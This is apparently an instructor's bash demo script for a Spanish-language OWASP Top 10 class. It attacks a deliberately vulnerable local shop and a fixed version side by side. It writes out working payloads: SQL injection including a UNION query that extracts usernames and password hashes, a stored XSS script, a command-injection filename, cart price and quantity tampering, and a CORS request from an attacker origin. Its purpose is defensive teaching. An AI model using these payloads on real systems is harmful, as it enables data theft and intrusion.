#!/usr/bin/env bash
# Demo de la sesión 2: falla -> control en la Tienda UCP (OWASP Top 10:2025).
# Insegura en :5003, solución en :5004. Uso: bash demos/sesion-2/02-tienda/demo-tienda.sh
set -u
cd "$(dirname "$0")" || exit 1
[ -f .soluciones/app.py ] || { echo "Falta .soluciones/app.py (solo en el equipo del docente)"; exit 1; }
DC="docker compose -f docker-compose.yml"
INS=http://127.0.0.1:5003
SEG=http://127.0.0.1:5004
ANA="Authorization: Bearer token-ana"

pausa() { printf '\n\033[1;33m>> %s\033[0m\n' "$1"; read -r -p "   [Enter para continuar] " _; }
etq()   { printf '   \033[1m%-9s\033[0m' "$1"; }
corto() { tr -s '\n ' ' ' | head -c "${1:-150}"; echo; }

pausa "0. Levantar la tienda: insegura en :5003 y segura en :5004 (solo 127.0.0.1)"
$DC up -d --build --quiet-pull 2>&1 | grep -vE '^\s*$' | tail -2
for _ in $(seq 30); do curl -sf $INS/salud >/dev/null && curl -sf $SEG/salud >/dev/null && break; sleep 1; done
$DC ps --format 'table {{.Service}}\t{{.Ports}}'

pausa "A05 · INYECCIÓN SQL. Búsqueda normal: q=Teclado"
etq Insegura; curl -s "$INS/productos?q=Teclado" | corto
pausa "   Ahora q=' OR 1=1 --   (el atacante cierra la comilla y anula el filtro visible=1)"
for u in $INS $SEG; do [ $u = $INS ] && etq Insegura || etq Segura
  curl -s -G "$u/productos" --data-urlencode "q=' OR 1=1 --" | corto 400; done
pausa "   Y con UNION lee otra tabla: usuarios y hashes de contraseña"
for u in $INS $SEG; do [ $u = $INS ] && etq Insegura || etq Segura
  curl -s -G "$u/productos" --data-urlencode "q=' UNION SELECT id, usuario || ':' || rol || ':' || hash_clave, 0 FROM usuarios --" | corto 330; done
echo "   Control: consulta parametrizada (?). El dato nunca se vuelve código."

pausa "A05 · XSS ALMACENADO. Ana deja una reseña con un <script>"
XSS="<script>document.body.style.background='crimson';document.querySelector('h1').textContent='Esta página la controla una reseña';</script>"
for u in $INS $SEG; do curl -s -o /dev/null -X POST "$u/productos/1/resenas" -H "$ANA" -H 'Content-Type: application/json' \
  -d "$(python3 -c 'import json,sys; print(json.dumps({"texto": sys.argv[1]}))' "$XSS")"; done
etq Insegura; curl -s $INS/productos/1/resenas | grep -o '<li><b>ana</b>: <script>[^<]*' | head -1 | cut -c1-110
etq Segura;   curl -s $SEG/productos/1/resenas | grep -o '&lt;script&gt;[^&]*' | head -1 | cut -c1-110
etq CSP;      curl -sI $SEG/productos/1/resenas | grep -i content-security-policy | tr -d '\r'
echo "   Ábranlas en el navegador:  $INS/productos/1/resenas   y   $SEG/productos/1/resenas"

pausa "A05 · INYECCIÓN DE COMANDOS. Reporte con nombre: x; id; uname -a #"
for u in $INS $SEG; do [ $u = $INS ] && etq Insegura || etq Segura
  curl -s -X POST "$u/reportes" -H "$ANA" -H 'Content-Type: application/json' -d '{"nombre":"x; id; uname -a #"}' | corto 220; done
echo "   Control: lista blanca del nombre + tarfile en Python, sin shell."

pausa "A06 · DISEÑO INSEGURO. Ana compra el monitor (1.100.000) diciendo que cuesta 1 peso"
CARRO='{"items":[{"id":3,"cantidad":1,"precio":1}]}'
for u in $INS $SEG; do [ $u = $INS ] && etq Insegura || etq Segura
  curl -s -X POST "$u/carrito/checkout" -H "$ANA" -H 'Content-Type: application/json' -d "$CARRO" | corto; done
pausa "   Cantidad negativa para «restar» un producto caro del total"
CARRO='{"items":[{"id":3,"cantidad":1,"precio":1100000},{"id":3,"cantidad":-1,"precio":1100000},{"id":4,"cantidad":1,"precio":25000}]}'
for u in $INS $SEG; do [ $u = $INS ] && etq Insegura || etq Segura
  curl -s -X POST "$u/carrito/checkout" -H "$ANA" -H 'Content-Type: application/json' -d "$CARRO" | corto; done
pausa "   El cupón de bienvenida (50 %, un solo uso) usado tres veces"
for u in $INS $SEG; do for i in 1 2 3; do [ $u = $INS ] && etq "Ins. $i" || etq "Seg. $i"
  curl -s -X POST "$u/carrito/checkout" -H "$ANA" -H 'Content-Type: application/json' \
    -d '{"items":[{"id":1,"cantidad":1,"precio":250000}],"cupon":"BIENVENIDA-ANA"}' | corto; done; done
echo "   Control de diseño: el servidor es la fuente de verdad (precio, límites, estado del cupón)."

pausa "A10 · CONDICIONES EXCEPCIONALES. Se cae la pasarela de pagos (timeout)"
PASARELA=caida $DC up -d 2>&1 | tail -1
for _ in $(seq 30); do curl -sf $INS/salud >/dev/null && curl -sf $SEG/salud >/dev/null && break; sleep 1; done
for u in $INS $SEG; do [ $u = $INS ] && etq Insegura || etq Segura
  curl -s -w '  [HTTP %{http_code}]' -X POST "$u/carrito/checkout" -H "$ANA" -H 'Content-Type: application/json' \
    -d '{"items":[{"id":2,"cantidad":1,"precio":90000}]}' | corto; done
echo "   Insegura: entregó el mouse sin cobrar (falla abierta). Segura: 503 y no crea el pedido."
$DC up -d 2>&1 | tail -1
for _ in $(seq 30); do curl -sf $INS/salud >/dev/null && curl -sf $SEG/salud >/dev/null && break; sleep 1; done

pausa "A02 · CONFIGURACIÓN. Un sitio ajeno pide el pedido de Ana con su sesión (CORS)"
for u in $INS $SEG; do [ $u = $INS ] && etq Insegura || etq Segura
  curl -s -D - -o /dev/null "$u/pedidos/1" -H "$ANA" -H 'Origin: https://atacante.example' \
    | grep -iE 'access-control|x-content-type|content-security' | tr -d '\r' | tr '\n' ' '; echo; done
echo "   Insegura: refleja el origen del atacante y permite credenciales. Segura: lista blanca + cabeceras."

pausa "Fin. Ahora ustedes: bash demos/sesion-2/02-tienda/katas.sh   (27 pruebas, 7 katas)"
echo "   Para apagar: docker compose -f demos/sesion-2/02-tienda/docker-compose.yml down"
